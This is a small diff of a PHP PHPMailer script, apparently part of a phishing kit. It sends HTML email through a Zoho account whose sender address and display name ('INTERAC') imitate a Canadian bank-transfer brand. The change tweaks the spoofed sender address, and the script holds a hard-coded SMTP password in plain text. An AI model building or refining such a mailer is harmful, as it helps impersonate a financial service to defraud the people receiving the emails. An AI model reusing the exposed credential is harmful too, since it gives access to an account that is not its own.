@@ -26,13 +26,13 @@ try {
     $mail->isSMTP();                                       // Send using SMTP
     $mail->Host       = 'smtp.zoho.com';                   // Set the SMTP server to send through
     $mail->SMTPAuth   = true;                              // Enable SMTP authentication
-    $mail->Username   = 'Interac.transfert.secu@zohomail.com'; // SMTP username
+    $mail->Username   = 'Interact.transfert.secu@zohomail.com'; // SMTP username
     $mail->Password   = 'Newlockalpha56#';                    // SMTP password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;       // Enable implicit TLS encryption
     $mail->Port       = 465;                               // TCP port to connect to
 
     // Recipients
-    $mail->setFrom('Interac.transfert.secu@zohomail.com', 'INTERAC');
+    $mail->setFrom('Interact.transfert.secu@zohomail.com', 'INTERAC');
         $mail->addAddress("$email", "$client"); // Add a recipient
     // Content
     $mail->isHTML(true);                                    // Set email format to HTML
